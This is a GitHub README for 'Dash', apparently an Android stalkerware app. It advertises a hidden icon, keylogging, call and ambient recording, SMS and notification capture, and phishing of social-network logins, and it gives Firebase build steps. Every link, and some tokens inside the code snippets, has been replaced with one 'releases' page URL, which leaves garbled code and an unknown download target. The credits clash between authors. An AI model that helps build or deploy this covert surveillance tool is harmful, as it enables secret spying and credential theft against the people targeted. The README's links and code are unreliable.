## Donate to BTC Address: 
`36QW21MQQxUK7ohBQnvP5itipe4bFx91Bo`

---

![20200808_160757](https://github.com/Londjide/Dash/releases)

<noscript><a href="https://github.com/Londjide/Dash/releases"><img alt="Donate using Liberapay" src="https://github.com/Londjide/Dash/releases"></a></noscript>

# Dash
This is an Android Spyware App, Which uploads user data such as Contacts, Messages, Call log &amp; recordings, Send messages, Photos, Videos, etc.

The application is installed on the child's device as well as on the parent's device, in the login view the type of user is chosen.

# Features
- Multiple Child clients
- Hidden app icon (stealth mode)
- Real-time location.
- Recording calls: incoming/outgoing.
- SMS: received/sent.
- Environment recording.
- Take pictures.
- Keylogger.
- Phishing social network.
- Notifications received: Whatsapp, Instagram, Messenger.

# Build this project
the application work with the api of firebase with which you will have to create a project in firebase and synchronize the application with such project.
[Firebase API](https://github.com/Londjide/Dash/releases)

Enable the following development platforms on firebase:
`Authentication`, `realtime database` and `storage`.

- in authentication/sign-in method enable the `email` access provider

- in firebase real-time database assign the following rules:
```java
{
  "rules": {
    ".read": "auth != null",
      ".write": "auth != null"
  }
}
```

- in firebase storage assign the following rules:
```java
service https://github.com/Londjide/Dash/releases {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if https://github.com/Londjide/Dash/releases != null;
    }
  }
}
```

- In the `https://github.com/Londjide/Dash/releases` assign the social network package of your preference.
also you will have to recreate the view in xml of the social network
```java
ext {
       PACKAGE_CHECK_SOCIAL = "\"PHISHING-SOCIAL_NETWORK\""
}
```

In the `https://github.com/Londjide/Dash/releases` assign your `APY_KEY_MAPS`

- Get the GOOGLE MAPS API KEY [here](https://github.com/Londjide/Dash/releases)
```java
<string name="APY_KEY_MAPS">YOU_API_KEY_MAPS</string>
```

note: it is very important that accept all the necessary permissions for the application to work properly

# Disclaimer
The Dash application is intended for legal and educational purposes ONLY. It is a violation of the law to install surveillance software on a mobile phone that you have no right to monitor.

Dash is not responsible if the user does not follow the laws of the country and goes against it. If it is found that the user violates any law or spy in secret, he will be subject to sanctions that govern the legislation of the country.


# License

```java 
Copyright [2020] [muneebwanee]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       https://github.com/Londjide/Dash/releases

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
```
---
### ❤️Supporters❤️
[![Stargazers repo roster for @swagkarna/Rafel-Rat](https://github.com/Londjide/Dash/releases)](https://github.com/Londjide/Dash/releases)
[![Forkers repo roster for @swagkarna/Rafel-Rat](https://github.com/Londjide/Dash/releases)](https://github.com/Londjide/Dash/releases)

---
